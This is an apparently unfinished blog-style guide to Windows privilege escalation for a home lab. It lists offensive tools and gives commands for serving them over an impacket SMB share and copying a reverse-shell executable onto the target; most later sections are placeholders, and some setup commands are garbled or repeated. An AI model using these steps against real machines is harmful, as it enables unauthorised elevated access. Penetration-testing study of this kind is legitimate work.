---
title:  Privilege Escalation Blueprint
date: 2024-11-03 11:19:36
tags: 
- Windows
- privesc
---

In this guide, I’ll walk you through essential Windows privilege escalation techniques, covering various methods from kernel exploits to application misconfigurations. We’ll start by setting up our lab environment and tools, then dive into specific methods for escalation.
## Table of Contents
- [Introduction](#introduction)
- [Lab Setup and Tools](#lab-setup-and-tools)
   - [Lab Setup](#lab-setup)
   - [Privilege Escalation Tools](#privilege-escalation-tools)
- [Kernel and Service Exploits](#kernel-and-service-exploits)
- [Passwords](#passwords)
5. [Registry](#registry)
6. [Insecure GUI Applications](#insecure-gui-applications)
7. [Scheduled Tasks](#scheduled-tasks)
8. [Installed Applications](#installed-applications)
9. [Port Forwarding](#port-forwarding)
10. [Startup Applications](#startup-applications)
11. [Conclusion](#conclusion)

---



## Lab Setup and Tools
### Lab Setup
For this guide, I’m using a virtual environment with Kali Linux as the attack machine and Windows 10 as the target machine. environment is configured with default security settings and  Windows defender was disabled to focus on learning the techniques. 

**![Image Placeholder: Lab Setup]**


List of tools used:
```
accesschk.exe          juicypotato.zip  Procmon64.exe  SharpUp.exe
CreateShortcut.vbs     plink.exe        PsExec64.exe   winPEASany.exe
cve-2018-8120-x64.exe  potato.exe       Seatbelt.exe
JuicyPotato.exe        PowerUp.ps1      setup.bat
```

Transfering tools over to the victim:
in order to move the files to our target we will use SMB.


![alt text](../images/priv-esc-win/smve.png)

start  SMB server on Kali:
```python
python /usr/share/doc/python3-impacket/examples/smbserver.py tools .
```

on windows open cmd as admin,   cd to desktop 

start the  SMB Server

```
python /usr/share/doc/python3-impacket/examples/smbserver.py tools .
```

```cmd
cp C:/Users/vboxuser/Desktop/
\\192.168.5.4\tools\reverse.exe
```
---
## Concepts of Windows Access Control
## User Accounts
Think of a user account as a collection of settings / preferences
bound to a unique identity.
The local “Administrator” account is created by default at
installation.

## SERVICE ACCOUNTS
Service accounts are (somewhat obviously) used to run services
in Windows.
Service accounts cannot be used to sign into a Windows system.
==The SYSTEM account is a default service account which has the==
==highest privileges== of any local account in Windows.
Other default service accounts include NETWORK SERVICE and
LOCAL SERVICE.

## Groups
Pseudo groups (e.g. “Authenticated Users”) have a dynamic list of
members which changes based on certain interactions.
## Resources
In Windows, there are multiple types of resource (also known as
objects):
• Files / Directories
• Registry Entries
• Services
Whether a user and/or group has permission to perform a certain action
on a resource depends on that resource’s access control list (ACL).
## ACLs & ACEs
Permissions to access a certain resource in Windows are
controlled by the access control list (ACL) for that resource.
Each ACL is made up of zero or more access control entries
(ACEs).
Each ACE defines the relationship between a principal (e.g. a
user, group) and a certain access right.

![[offensive security/Screenshots/images/images 1/Pasted image 20240809211734.png]]

## Kernel and Service Exploits
Kernel exploits allow you to escalate privileges by taking advantage of vulnerabilities in the system’s core processes or services. This section explores common kernel and service vulnerabilities and methods to exploit them.

**![Image Placeholder: Kernel and Service Exploit Process]**

---

## Passwords
In this section, we look at methods to locate and exploit weak or hardcoded passwords on a system. Tools like `mimikatz` can be particularly useful for this.

**![Image Placeholder: Password Extraction]**

---

## Registry
The Windows Registry stores configuration settings, some of which may be misconfigured in a way that allows privilege escalation. Here’s what to look for in the registry and how to leverage any insecure settings.

**![Image Placeholder: Registry Exploitation Steps]**

---

## Insecure GUI Applications
GUI applications that run with elevated privileges but have insecure settings can be exploited to execute arbitrary code. This section covers how to identify and take advantage of these applications.

**![Image Placeholder: GUI Application Exploitation]**

---

## Scheduled Tasks
Misconfigured scheduled tasks may allow an attacker to replace executables or scripts with their own. This section explains how to find and exploit such tasks for privilege escalation.

**![Image Placeholder: Scheduled Task Exploitation Steps]**

---

## Installed Applications
Improperly configured installed applications can present opportunities for privilege escalation. Here, we’ll cover common misconfigurations in applications that can be exploited.

**![Image Placeholder: Application Misconfiguration Exploitation]**

---

## Port Forwarding
If network restrictions are blocking your path, port forwarding can help bypass them. Learn how to use port forwarding to create new attack vectors in restricted environments.

**![Image Placeholder: Port Forwarding Example]**

---

## Startup Applications
Applications set to run at startup, especially those with elevated privileges, may be vulnerable to exploitation. Here’s how to check for these applications and leverage any vulnerabilities.

**![Image Placeholder: Startup Application Exploitation]**

---

## Conclusion
Privilege escalation is a critical skill in penetration testing, and mastering these techniques gives you powerful insight into system security. This guide covers various practical methods, from kernel exploits to startup applications, ensuring you have a solid toolkit for real-world scenarios. Always remember to test responsibly!
